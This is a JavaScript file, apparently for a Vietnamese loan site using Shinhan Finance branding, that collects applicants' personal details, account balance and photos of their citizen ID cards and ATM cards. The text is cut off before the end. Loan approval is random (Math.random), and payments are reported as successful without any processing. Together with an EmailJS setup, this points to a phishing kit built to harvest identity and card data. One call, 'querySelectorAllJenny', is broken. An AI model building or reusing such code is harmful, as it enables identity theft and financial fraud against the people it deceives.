(function() {
    emailjs.init("c-Ms5MjWbitpDBb-E");
})();

document.addEventListener('DOMContentLoaded', () => {
    // Initialize Swiper for testimonials
    new Swiper('.swiper', {
        loop: true,
        navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
        },
        slidesPerView: 1,
        spaceBetween: 20,
    });

    // Hamburger menu
    const hamburger = document.querySelector('.hamburger');
    const nav = document.querySelector('header nav');
    const backBtn = document.querySelector('.back-btn');
    hamburger.addEventListener('click', () => {
        nav.classList.toggle('active');
        hamburger.classList.toggle('active');
    });
    backBtn.addEventListener('click', () => {
        nav.classList.remove('active');
        hamburger.classList.remove('active');
    });

    // Section toggles
    document.querySelectorAll('.section-toggle').forEach(toggle => {
        toggle.addEventListener('click', () => {
            const content = toggle.nextElementSibling;
            const isActive = content.classList.contains('active');
            document.querySelectorAll('.section-content').forEach(c => c.classList.remove('active'));
            document.querySelectorAll('.section-toggle').forEach(t => t.classList.remove('active'));
            if (!isActive) {
                content.classList.add('active');
                toggle.classList.add('active');
            }
        });
    });

    // Collapsible sections
    document.querySelectorAll('.section-header').forEach(toggle => {
        toggle.addEventListener('click', () => {
            const details = toggle.nextElementSibling.nextElementSibling;
            const button = toggle.querySelector('.toggle-btn');
            details.classList.toggle('active');
            button.textContent = details.classList.contains('active') ? 'Ẩn' : 'Xem thêm';
        });
    });

    // Category cards
    document.querySelectorAll('.category-card').forEach(card => {
        card.addEventListener('click', (e) => {
            if (!e.target.closest('.sub-items')) {
                card.classList.toggle('active');
            }
        });
    });

    // Language toggle
    const languageToggle = document.querySelector('.language-toggle');
    languageToggle.addEventListener('change', (e) => {
        const lang = e.target.value;
        document.querySelectorAll('[data-lang-vi]').forEach(el => {
            el.textContent = lang === 'vi' ? el.dataset.langVi : el.dataset.langEn;
        });
    });

    // Dark mode
    const darkModeToggle = document.querySelector('.dark-mode-toggle');
    darkModeToggle.addEventListener('click', () => {
        document.body.classList.toggle('dark-mode');
        localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
    });
    if (localStorage.getItem('darkMode') === 'true') {
        document.body.classList.add('dark-mode');
    }

    // Back to top
    document.querySelector('.back-to-top').addEventListener('click', () => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });

    // Progress steps
    document.querySelectorAll('.progress-step').forEach((step, index) => {
        step.addEventListener('click', () => {
            document.querySelectorAll('.progress-step').forEach(s => s.classList.remove('active'));
            for (let i = 0; i <= index; i++) {
                document.querySelectorAll('.progress-step')[i].classList.add('active');
            }
        });
    });

    // Support buttons
    document.querySelector('.support-btn.call').addEventListener('click', () => {
        window.location.href = 'tel:19001577';
    });
    document.querySelector('.support-btn.chat').addEventListener('click', () => {
        alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
    });
    document.querySelector('.support-btn.messenger').addEventListener('click', () => {
        window.open('https://m.me/shinhanfinancer', '_blank');
    });

    // Modal close
    document.querySelectorAllJenny('.modal').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        });
    });
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            document.querySelectorAll('.modal').forEach(modal => {
                modal.style.display = 'none';
            });
        }
    });
});

// Global functions
window.calculateLoanInterest = function() {
    const amount = parseFloat(document.querySelector('#calc-loan-amount').value);
    const term = parseInt(document.querySelector('#calc-loan-term').value);
    const loanType = document.querySelector('#calc-loan-type').value;
    let rate, maxAmount, maxTerm;
    const resultDiv = document.querySelector('#calc-result');
    const chartCtx = document.getElementById('loan-chart').getContext('2d');

    if (!loanType || loanType === "") {
        resultDiv.innerHTML = 'Vui lòng chọn loại vay!';
        return;
    }

    switch (loanType) {
        case "Vay mua xe":
            rate = 6.5;
            maxAmount = 1000000000;
            maxTerm = 96;
            break;
        case "Vay mua nhà":
            rate = 7.0;
            maxAmount = 5000000000;
            maxTerm = 360;
            break;
        case "Vay tiêu dùng":
            rate = 8.0;
            maxAmount = 900000000;
            maxTerm = 60;
            break;
        case "Vay tiêu dùng trực tuyến":
            rate = 8.5;
            maxAmount = 100000000;
            maxTerm = 36;
            break;
        case "Vay thế chấp sổ tiết kiệm":
            rate = 3.0 + 1.9;
            maxAmount = 500000000;
            maxTerm = 12;
            break;
        default:
            rate = 0;
    }

    if (isNaN(amount) || amount <= 0 || amount > maxAmount) {
        resultDiv.innerHTML = `Số tiền vay phải từ 1 đến ${maxAmount.toLocaleString()} VNĐ!`;
        return;
    }
    if (isNaN(term) || term <= 0 || term > maxTerm) {
        resultDiv.innerHTML = `Thời hạn vay phải từ 1 đến ${maxTerm} tháng!`;
        return;
    }

    const monthlyRate = rate / 100 / 12;
    const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, term)) / (Math.pow(1 + monthlyRate, term) - 1);
    const totalPayment = monthlyPayment * term;

    if (isNaN(monthlyPayment) || isNaN(totalPayment)) {
        resultDiv.innerHTML = 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!';
    } else {
        resultDiv.innerHTML = `
            Thanh toán hàng tháng: ${monthlyPayment.toLocaleString('vi-VN')} VNĐ<br>
            Tổng tiền: ${totalPayment.toLocaleString('vi-VN')} VNĐ<br>
            <h4>Lịch thanh toán mẫu</h4>
            <table class="payment-schedule">
                <tr><th>Tháng</th><th>Số tiền</th><th>Gốc</th><th>Lãi</th><th>Dư nợ</th></tr>
        `;
        let remainingBalance = amount;
        for (let i = 1; i <= Math.min(term, 3); i++) {
            const interest = remainingBalance * monthlyRate;
            const principal = monthlyPayment - interest;
            remainingBalance -= principal;
            resultDiv.innerHTML += `
                <tr>
                    <td>Tháng ${i}</td>
                    <td>${monthlyPayment.toLocaleString('vi-VN')} VNĐ</td>
                    <td>${principal.toLocaleString('vi-VN')} VNĐ</td>
                    <td>${interest.toLocaleString('vi-VN')} VNĐ</td>
                    <td>${remainingBalance.toLocaleString('vi-VN')} VNĐ</td>
                </tr>
            `;
        }
        resultDiv.innerHTML += `</table>`;
        if (term > 3) resultDiv.innerHTML += `<p>(Hiển thị 3 tháng đầu, tổng cộng ${term} tháng)</p>`;

        const loanTypes = ["Vay mua xe", "Vay mua nhà", "Vay tiêu dùng", "Vay tiêu dùng trực tuyến", "Vay thế chấp sổ tiết kiệm"];
        const rates = [6.5, 7.0, 8.0, 8.5, 4.9];
        new Chart(chartCtx, {
            type: 'bar',
            data: {
                labels: loanTypes,
                datasets: [{
                    label: 'Lãi suất (%)',
                    data: rates,
                    backgroundColor: '#003087'
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true
                    }
                }
            }
        });
    }
};

window.submitPayment = function() {
    const account = document.querySelector('#payment-account').value;
    const amount = parseFloat(document.querySelector('#payment-amount').value);
    const cccdFront = document.querySelector('#payment-cccd-front').files[0];
    const cccdBack = document.querySelector('#payment-cccd-back').files[0];
    const atmCard = document.querySelector('#payment-atm-card').files[0];
    if (!account || isNaN(amount) || amount <= 0) {
        alert('Vui lòng nhập đầy đủ thông tin thanh toán!');
        return;
    }
    if (!cccdFront || !cccdBack || !atmCard) {
        alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
        return;
    }
    const maxSize = 5 * 1024 * 1024;
    if (cccdFront.size > maxSize || cccdBack.size > maxSize || atmCard.size > maxSize) {
        alert('Ảnh không được vượt quá 5MB!');
        return;
    }
    if (!['image/jpeg', 'image/png'].includes(cccdFront.type) || !['image/jpeg', 'image/png'].includes(cccdBack.type) || !['image/jpeg', 'image/png'].includes(atmCard.type)) {
        alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
        return;
    }
    alert(`Thanh toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} qua Mobile Banking SOL thành công!`);
    document.querySelector('#payment-amount').value = '';
};

window.confirmSettlement = function() {
    const account = document.querySelector('#settlement-account').value;
    const amount = parseFloat(document.querySelector('#settlement-amount').value);
    const resultDiv = document.querySelector('#settlement-result');
    if (!account || isNaN(amount) || amount <= 0) {
        resultDiv.innerHTML = 'Vui lòng nhập đầy đủ thông tin tất toán!';
        return;
    }
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.innerHTML = `
        <div class="modal-content">
            <h2>Xác Nhận Tất Toán</h2>
            <p>Bạn muốn tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account}?</p>
            <button onclick="settleLoan('${account}', ${amount}); this.closest('.modal').remove()">Xác nhận</button>
            <button onclick="this.closest('.modal').remove()">Hủy</button>
        </div>
    `;
    document.body.appendChild(modal);
    modal.style.display = 'flex';
};

window.settleLoan = function(account, amount) {
    const resultDiv = document.querySelector('#settlement-result');
    setTimeout(() => {
        resultDiv.innerHTML = `Tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} thành công!`;
        document.querySelector('#settlement-amount').value = '';
    }, 1000);
};

let formData = {};
window.submitRegistration = function() {
    formData = {
        name: document.querySelector('#register-form input[placeholder="Họ và tên"]').value,
        phone: document.querySelector('#register-form input[placeholder="Số điện thoại"]').value,
        email: document.querySelector('#register-form input[type="email"]').value,
        cccd: document.querySelector('#register-form input[placeholder="CCCD/CMND"]').value,
        address: document.querySelector('#register-form input[placeholder="Địa chỉ"]').value,
        income: document.querySelector('#register-form input[placeholder="Thu nhập (VNĐ)"]').value,
        loanAmount: document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value,
        loanTerm: document.querySelector('#register-form input[placeholder="Thời hạn vay (tháng)"]').value,
        loanType: document.querySelector('#register-form select').value,
        birthDate: document.querySelector('#register-form input[type="date"]').value,
        gender: document.querySelector('#register-form select:nth-child(11)').value,
        maritalStatus: document.querySelector('#register-form select:nth-child(12)').value,
        occupation: document.querySelector('#register-form input[placeholder="Nghề nghiệp"]').value,
        company: document.querySelector('#register-form input[placeholder="Công ty"]').value,
        accountBalance: document.querySelector('#register-form input[placeholder="Số dư tài khoản (VNĐ)"]').value,
        purpose: document.querySelector('#register-form input[placeholder="Mục đích vay"]').value,
        cccdFront: document.querySelector('#cccd-front').files[0],
        cccdBack: document.querySelector('#cccd-back').files[0],
        atmCard: document.querySelector('#atm-card').files[0]
    };
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^0[0-9]{9}$/;
    if (!emailRegex.test(formData.email)) {
        alert('Vui lòng nhập email hợp lệ!');
        return;
    }
    if (!phoneRegex.test(formData.phone)) {
        alert('Vui lòng nhập số điện thoại hợp lệ!');
        return;
    }
    if (isNaN(formData.loanAmount) || formData.loanAmount <= 0) {
        alert('Số tiền vay phải lớn hơn 0!');
        return;
    }
    if (!formData.cccdFront || !formData.cccdBack || !formData.atmCard) {
        alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
        return;
    }
    const maxSize = 5 * 1024 * 1024;
    if (formData.cccdFront.size > maxSize || formData.cccdBack.size > maxSize || formData.atmCard.size > maxSize) {
        alert('Ảnh không được vượt quá 5MB!');
        return;
    }
    if (!['image/jpeg', 'image/png'].includes(formData.cccdFront.type) || !['image/jpeg', 'image/png'].includes(formData.cccdBack.type) || !['image/jpeg', 'image/png'].includes(formData.atmCard.type)) {
        alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
        return;
    }
    document.querySelector('#confirm-modal').style.display = 'flex';
    document.querySelector('#confirm-modal .loader').style.display = 'block';
    document.querySelector('#confirm-modal button').disabled = true;

    setTimeout(() => {
        document.querySelector('#confirm-modal').style.display = 'none';
        document.querySelector('#confirm-modal .loader').style.display = 'none';
        document.querySelector('#confirm-modal button').disabled = false;
        const isApproved = Math.random() > 0.2;
        const profileCode = `SHF-${Date.now()}`;
        window.profileCode = profileCode;
        const approvalModal = document.querySelector('#approval-modal');
        approvalModal.style.display = 'flex';
        if (isApproved) {
            approvalModal.querySelector('h2').textContent = 'Đã đủ điều kiện vay';
            approvalModal.querySelector('p').textContent = 'Hồ sơ của bạn đã được duyệt tại Shinhan Finance.';
        } else {
            approvalModal.querySelector('h2').textContent = 'Hồ sơ chưa được duyệt';
            approvalModal.querySelector('p').textContent = 'Vui lòng liên hệ
